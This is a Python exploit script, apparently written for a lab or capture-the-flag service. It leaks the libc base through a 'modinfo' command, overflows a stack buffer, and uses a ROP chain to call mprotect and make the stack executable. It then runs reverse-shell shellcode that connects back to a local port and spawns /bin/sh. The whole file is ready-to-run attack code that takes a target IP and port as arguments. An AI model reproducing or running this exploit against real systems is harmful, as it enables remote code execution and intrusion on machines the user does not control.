import sys
import struct
import socket


def get_rop_chain(base=0):
    # syscall number: rax
    # params: rdi rsi rdx
    # mprotect(addr, len_bytes, prot)
    # prot = PROT_READ | PROT_WRITE | PROT_EXEC
    # prot = 7

    rop_chain =  b''

    # GetStackPtr[rax] chain
    rop_chain += struct.pack('<Q', base+0x00000000001148be)  # push rsp ; and al, 0x10 ; mov rcx, qword [rsp+0x08] ; mov rax, qword [rsp+0x00] ; add rsp, 0x38 ; ret
    rop_chain += struct.pack('<Q', 0xaaaaaaaaaaaaaaaa)       # PADDING because of stack movement
    rop_chain += struct.pack('<Q', 0xaaaaaaaaaaaaaaaa)       # PADDING because of stack movement
    rop_chain += struct.pack('<Q', 0xaaaaaaaaaaaaaaaa)       # PADDING because of stack movement
    rop_chain += struct.pack('<Q', 0xaaaaaaaaaaaaaaaa)       # PADDING because of stack movement
    rop_chain += struct.pack('<Q', 0xaaaaaaaaaaaaaaaa)       # PADDING because of stack movement
    rop_chain += struct.pack('<Q', 0xaaaaaaaaaaaaaaaa)       # PADDING because of stack movement

    # LoadConst[rdx][0] chain
    rop_chain += struct.pack('<Q', base+0x00000000001249da)  # pop rdx ; ret
    rop_chain += struct.pack('<Q', 0x0000000000000000)       # CONSTANT 0

    # LoadConst[rcx][0xfffffffffffff000] chain
    rop_chain += struct.pack('<Q', base+0x00000000000e825e)  # pop rcx ; ret
    rop_chain += struct.pack('<Q', 0xfffffffffffff000)       # CONSTANT 0xfffffffffffff000

    # CustomValue[0x000000000010c721] chain
    rop_chain += struct.pack('<Q', base+0x000000000010c721)  # and rax, rcx ; or rax, rdx ; ret

    # LoadConst[rdi][0x0] chain
    rop_chain += struct.pack('<Q', base+0x0000000000028265)  # pop rdi ; ret
    rop_chain += struct.pack('<Q', 0x0000000000000000)       # CONSTANT 0x0

    # MoveReg[rdx][rax] chain
    rop_chain += struct.pack('<Q', base+0x00000000000c9477)  # mov rdx, rax ; mov rax, rbx ; cmovne rax, rdx ; add rsp, 0x08 ; pop rbx ; pop rbp ; ret
    rop_chain += struct.pack('<Q', 0xaaaaaaaaaaaaaaaa)       # PADDING because of stack movement
    rop_chain += struct.pack('<Q', 0xaaaaaaaaaaaaaaaa)       # PADDING because of stack movement
    rop_chain += struct.pack('<Q', 0xaaaaaaaaaaaaaaaa)       # PADDING because of stack movement

    # AddReg[rdi][rdx] chain
    rop_chain += struct.pack('<Q', base+0x000000000015d6aa)  # add rdi, rdx ; lea rax, qword [rdi+rax*4] ; ret

    # LoadConst[rsi][4095] chain
    rop_chain += struct.pack('<Q', base+0x0000000000029cf1)  # pop rsi ; ret
    rop_chain += struct.pack('<Q', 0x0000000000000fff)       # CONSTANT 4095

    # LoadConst[rdx][7] chain
    rop_chain += struct.pack('<Q', base+0x00000000001249da)  # pop rdx ; ret
    rop_chain += struct.pack('<Q', 0x0000000000000007)       # CONSTANT 7

    # LoadConst[rax][10] chain
    rop_chain += struct.pack('<Q', base+0x00000000000420b2)  # pop rax ; ret
    rop_chain += struct.pack('<Q', 0x000000000000000a)       # CONSTANT 10

    # CustomValue[0x0000000000089746] chain
    rop_chain += struct.pack('<Q', base+0x0000000000089746)  # syscall ; ret

    # CustomValue[0x000000000003495e] chain
    rop_chain += struct.pack('<Q', base+0x000000000003495e)  # push rsp ; ret

    return rop_chain

def extract_libc_base(modinfo):
    try:
        modinfo = modinfo.decode()
        for line in modinfo.split('\n'):
            if '/usr/lib/libc.so.6' in line:
                i = line.find('-')
                if i == -1:
                    return None

                return int('0x'+line[:i].strip(), 16)

        return None


    except Exception as e:
        print(e)

    return None


def get_shellcode():
    shellcode = bytearray(
        b"\x48\x83\xc4\x80"                  # add    rsp,0xffffffffffffff80
        b"\x48\x83\xe4\xf0"                  # and    rsp,0xfffffffffffffff0
        b"\x48\x89\xe5"                      # mov    rbp,rsp
        b"\x48\x83\xc4\x80"                  # add    rsp,0xffffffffffffff80
        b"\x6a\x29"                          # push   0x29
        b"\x58"                              # pop    rax
        b"\x99"                              # cdq
        b"\x6a\x02"                          # push   0x2
        b"\x5f"                              # pop    rdi
        b"\x6a\x01"                          # push   0x1
        b"\x5e"                              # pop    rsi
        b"\x0f\x05"                          # syscall
        b"\x97"                              # xchg   edi,eax
        b"\xb0\x2a"                          # mov    al,0x2a
        b"\x48\xb9\x02\x00\x08\xae\x7f"      # movabs rcx,0x100007fae080002
        b"\x00\x00\x01"
        b"\x51"                              # push   rcx
        b"\x54"                              # push   rsp
        b"\x5e"                              # pop    rsi
        b"\xb2\x10"                          # mov    dl,0x10
        b"\x0f\x05"                          # syscall
        b"\x6a\x03"                          # push   0x3
        b"\x5e"                              # pop    rsi
        b"\xb0\x21"                          # mov    al,0x21
        b"\xff\xce"                          # dec    esi
        b"\x0f\x05"                          # syscall
        b"\x75\xf8"                          # jne    32 <dup2_loop>
        b"\x99"                              # cdq
        b"\xb0\x3b"                          # mov    al,0x3b
        b"\x52"                              # push   rdx
        b"\x48\xb9\x2f\x62\x69\x6e\x2f"      # movabs rcx,0x68732f2f6e69622f
        b"\x2f\x73\x68"
        b"\x51"                              # push   rcx
        b"\x54"                              # push   rsp
        b"\x5f"                              # pop    rdi
        b"\x0f\x05"                          # syscall
    )

    return bytes(shellcode)

def main():
    if len(sys.argv) != 3:
        print('Usage: {0} <target-ip> <target-port>'.format(sys.argv[0]))
        return 1

    s = socket.socket()
    s.connect((sys.argv[1], int(sys.argv[2])))

    s.send(b'modinfo')
    modinfo = s.recv(4096)

    libc_base = extract_libc_base(modinfo)

    if libc_base == None:
        print('Couldnt find libc base')
        return 1
    
    print('Libc Base: {0}'.format(hex(libc_base)))
    input('Press enter to continue...')

    buff = b'A' * 152
    buff += get_rop_chain(base=libc_base)
    buff += get_shellcode()
    buff += b'\x90' * (4095 - len(buff))

    print('Will send {0} bytes'.format(len(buff)))
    if len(buff) > 4095:
        print('Too many bytes. Aborting')
        return 1

    s.send(buff)


if __name__ == '__main__':
    ret = main()
    sys.exit(ret)
